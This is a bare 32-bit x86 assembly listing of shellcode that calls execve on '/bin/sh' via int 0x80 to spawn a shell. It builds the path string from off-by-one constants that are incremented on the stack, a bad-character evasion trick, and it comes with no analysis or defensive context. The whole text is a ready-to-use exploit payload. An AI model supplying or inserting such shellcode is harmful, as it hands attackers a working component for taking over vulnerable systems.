[bits 32]

	; envp = NULL
	xor edx, edx

	; filename = "/bin/sh"
	push byte 0x68
	push word 0x732e
	add word [esp], 0x1
	push dword 0x6e69622e
	add word [esp], 0x1
	mov ebx, esp

	; argv = { filename, NULL }
	push edx  ; NULL
	push ebx  ; "/bin/sh"
	mov ecx, esp

	; syscall execve
	push byte 11
	pop eax
	int 0x80
